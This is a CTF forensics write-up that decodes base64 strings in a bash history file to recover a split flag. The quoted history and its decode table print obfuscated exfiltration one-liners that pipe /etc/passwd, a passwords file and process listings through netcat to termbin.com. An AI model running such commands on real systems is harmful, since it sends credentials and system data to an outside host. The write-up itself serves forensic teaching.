
# Challenge Name: History  


![date](https://img.shields.io/badge/date-16.03.2021-brightgreen.svg)  
![solved after CTF](https://img.shields.io/badge/solved-after%20CTF-red.svg) 
![misc category](https://img.shields.io/badge/category-forensics-lightgrey.svg)
![score](https://img.shields.io/badge/score-100-blue.svg)


## Attached files
- [ctrl_H](ctrl_H)





## Detailed solution
The challenge talk about a file found at one of the company's computers. The file represent a list of commands which is similar to a bash history file.  

Start looking at the file, we found some base64 encoding strings : 

````bash
echo aWRlaDEK | base64 -d
echo cHMgYXggPiBwcm9jZXNzZXM= | base64 -d | bash
echo Y2F0IHByb2Nlc3NlcyB8IG5jIHRlcm1iaW4uY29tIDEzMzcK | base64 -d | bash
echo bHMgLWwgfCBuYyB0ZXJtYmluLmNvbSAxMzM3Cg== | base64 -d | bash
echo kwYURONVgzTjBNR3d6WDIxNVgyUTBkRFI5Q2c9PQo=
echo ZWNobyBhV1JsYUh0MGFEQnpNMTlpTkRWME0zSmtOVj
echo Y2F0IC9ldGMvcGFzc3dkIHwgbmMgdGVybWJpbi5jb20gMTMzNwo= | base64 -d | bash
echo Y2F0IHBhc3N3b3Jkcy50eHQgfCBuYyB0ZXJtYmluLmNvbSAxMzM3Cg== | base64 -d | bash
````
Let's decode them : 

````
aWRlaDEK                                                             ideh1
cHMgYXggPiBwcm9jZXNzZXM=                                             ps ax > processes
Y2F0IHByb2Nlc3NlcyB8IG5jIHRlcm1iaW4uY29tIDEzMzcK                     cat processes | nc termbin.com 1337
bHMgLWwgfCBuYyB0ZXJtYmluLmNvbSAxMzM3Cg==                             ls -l | nc termbin.com 1337 
kwYURONVgzTjBNR3d6WDIxNVgyUTBkRFI5Q2c9PQo=                           DãU4ãÔww¥#U%DE#6sÓÐ
ZWNobyBhV1JsYUh0MGFEQnpNMTlpTkRWME0zSmtOVj                           echo aWRlaHt0aDBzM19iNDV0M3JkNV ideh{th0s3_b45t3rd5
Y2F0IC9ldGMvcGFzc3dkIHwgbmMgdGVybWJpbi5jb20gMTMzNwo=                 cat /etc/passwd | nc termbin.com 1337
Y2F0IHBhc3N3b3Jkcy50eHQgfCBuYyB0ZXJtYmluLmNvbSAxMzM3Cg==             cat passwords.txt | nc termbin.com 1337
````

We reconize the first part from the flag "ideh{th0s3_b45t3rd5" we can assume that the other part has been cut from the encoded base64. 
  
Decoding "kwYURONVgzTjBNR3d6WDIxNVgyUTBkRFI5Q2c9PQo=" has produce some random caracteres so probably it's the missing part.  

The **CTRL_H** from the challenge filename is a keyboard shortcut for bash used to delete the character before the cursor. So we know that a part has been deleted.   

Lets combine ZWNobyBhV1JsYUh0MGFEQnpNMTlpTkRWME0zSmtOVj and kwYURONVgzTjBNR3d6WDIxNVgyUTBkRFI5Q2c9PQo= and decode it : 

````
ZWNobyBhV1JsYUh0MGFEQnpNMTlpTkRWME0zSmtOVjkwYURONVgzTjBNR3d6WDIxNVgyUTBkRFI5Q2c9PQo= 
-> echo aWRlaHt0aDBzM19iNDV0M3JkNV90aDN5X3N0MGwzX215X2Q0dDR9Cg==
-> ideh{th0s3_b45t3rd5_th3y_st0l3_my_d4t4}
````

## Flag

```
ideh{th0s3_b45t3rd5_th3y_st0l3_my_d4t4} 
```
